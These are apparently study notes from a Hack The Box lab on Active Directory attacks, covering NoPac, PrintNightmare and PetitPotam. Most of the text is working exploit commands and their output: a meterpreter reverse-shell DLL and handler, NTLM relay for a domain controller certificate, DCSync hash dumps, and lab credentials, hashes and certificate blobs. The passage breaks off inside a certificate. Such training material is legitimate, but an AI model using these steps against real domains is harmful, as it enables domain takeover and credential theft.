# 🩸 Bleeding Edge Vulnerabilities

{% hint style="warning" %}
if we do not understand how these attack work or the risk they could pose to a production environment, it would be best not to attempt them during a real-world client engagement.
{% endhint %}

{% hint style="info" %}
In this section, we will perform all examples from a Linux attack host. You can spawn the hosts for this section at the end of this section and SSH into the ATTACK01 Linux attack host. For the portion of this section that demonstrates interaction from a Windows host (using Rubeus and Mimikatz), you could spawn the MS01 attack host in the previous or next section and use the base64 certificate blob obtained using `ntlmrelayx.py` and `petitpotam.py` to perform the same pass-the-ticket attack using Rubeus as demonstrated near the end of this section.
{% endhint %}

### NoPac (SamAccountName Spoofing)

\
This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command

`42278` is a bypass vulnerability with the Security Account Manager (SAM).`42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.

This exploit path takes advantage of being able to change the `SamAccountName` of a computer account to that of a Domain Controller.&#x20;

First we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.

{% embed url="https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware" %}

We can use this [tool](https://github.com/Ridter/noPac) to perform this attack. We need to be sure we have impacket downloaded:

```shell-session
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install 
#cloning noPac
git clone https://github.com/Ridter/noPac.git
```

Then we can check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`

```shell-session
ElFelixi0@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
<SNIP>                                         
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

To run noPac in order to get a shell ->\


```shell-session
ElFelixi0@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
<SNIP>
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

{% hint style="info" %}
with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`
{% endhint %}

{% hint style="info" %}
NoPac.py does save the TGT in the directory on the attack host where the exploit was run
{% endhint %}

We can then use the  file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py.

```shell-session
ElFelixi0@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
<SNIP>
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
```

### PrintNightmare

`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675))&#x20;

```
#clone exploit
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

{% hint style="info" %}
we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket we got
{% endhint %}

```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

```shell-session
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

If it's confirmed we need to craft a DLL with msfvenom

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

Then we host the payload on a SMB share ->

```shell-session
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Then we can use MSF to configure & start a multi handler responsible for catching the reverse shell

```shell-session
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

Now we can run exploit against target ->

```shell-session
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

Once we get a hit back, we can launch a shell and look at the user ->

```shell-session
(Meterpreter 1)(C:\Windows\system32) > shell
<SNIP>
C:\Windows\system32>whoami
whoami
nt authority\system
```

### PetitPotam (MS-EFSRPC)

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

{% embed url="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/" %}

&#x20;First off, we need to start `ntlmrelayx.py` on attackhost,  If we didn't know the location of the CA (we need to specify it), we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.

```shell-session
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

In another window, we can run the tool [PetitPotam.py](https://github.com/topotam/PetitPotam).

```shell-session
                      #<attackhost><DC IP>
python3 PetitPotam.py 172.16.5.225 172.16.5.5       
```

{% hint style="info" %}
powershell -> [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)

Mimikatz ->  `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`
{% endhint %}

Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.

```
<SNIP>
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
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
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
```

Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for DC

```shell-session
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

```shell-session
export KRB5CCNAME=dc01.ccache
```

We can then use this TGT with `secretsdump.py` to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.

```shell-session
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
#or 
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL 
```

Now with the NT hash, we can use it to access DC ->

```shell-session
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

***

Alternate route ->

once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target

```shell-session
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

And with the hash output:

```shell-session
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

***

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

```powershell-session
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

We can confirm this work with a simple Klist command

&#x20;**DCSync with Mimikatz**

we first need to grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync

```powershell-session
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

### Questions ->

_**Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.**_

First we connect with ssh to our attackbox on the network ->

```
ssh htb-student@10.129.34.89
```

Then we try and exploit PetitPotam:

```
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

and in another window ->

```
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>We catch a cert</p></figcaption></figure>

Then we use the following command to request for TGT

```
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 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